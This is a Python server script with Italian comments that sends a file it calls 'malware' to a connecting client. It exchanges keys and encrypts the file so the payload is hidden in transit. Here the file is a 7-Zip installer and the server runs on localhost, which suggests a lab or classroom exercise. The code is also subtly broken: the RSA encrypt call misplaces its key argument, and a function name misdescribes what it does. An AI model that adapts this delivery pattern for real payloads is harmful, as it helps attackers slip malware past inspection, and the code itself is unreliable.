import socket
import os       # path
import tqdm
import rsa      # generazione coppia di chiavi pubblica/privata
import pickle	# serializzazione
from cryptography.fernet import Fernet

BUFFER_SIZE = 4096
""" Funzione usata per generare la chiave simmetrica.
	Restituisce un oggetto di classe Fernet associato ad una chiave,
	al cui interno sono contenuti i metodi per la codifica e la decodifica """
def generateSymmetricKey():
	key = Fernet.generate_key()
	return key

def asymmetricDecryption(encodedMessage, fernet_key):
	return fernet_key.decrypt(encodedMessage).decode()


if __name__ == "__main__":
	ip = "127.0.0.1"
	port = 65432

	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.bind((ip, port))
	server.listen(1)

	while True:
		print("In attesa di connessioni...")
		client, address = server.accept()
		print("Connessione effettuata verso questo client {}:{}!".format(address[0], address[1]))

		# ricevo la chiave pubblica del client
		byte_client_public_key = client.recv(BUFFER_SIZE)  # aspetto una risposta
		public_key = pickle.loads(byte_client_public_key)
		client.send("Ok".encode("utf8"))

		# invio del file al client
		print("Invio del malware al client")
		path_malware = r"C:\Users\angel\Downloads\7z2201-x64.exe"
		filesize = os.path.getsize(path_malware)

		# start sending the file
		symmetric_key = generateSymmetricKey()
		progress = tqdm.tqdm(range(filesize), f"Sending {path_malware}", unit="B", unit_scale=True, unit_divisor=1024)
		with open(path_malware, "rb") as malware:
			# send the symmetric key first
			print("Invio della chiave simmetrica")
			byte_symmetric_key = pickle.dumps(symmetric_key)
			client.sendall(rsa.encrypt(byte_symmetric_key), public_key)
			print("chiave simmetrica: {}".format(str(pickle.dumps(symmetric_key))))
			# read the bytes from the file
			bytes_read = malware.read()
			# update the progress bar
			progress.update(len(bytes_read))
			key = Fernet(symmetric_key)
			encr_data = key.encrypt(bytes_read)
			data_size = len(encr_data)
			client.recv(10) # aspetto una risposta
			# invio la dimensione del file
			client.send(str(data_size).encode('utf8'))
			client.recv(10) # tengo il server in attesa prima di mandare i dati
			client.send(encr_data)

		client.close()
		print("Ho terminato l'invio del malware!")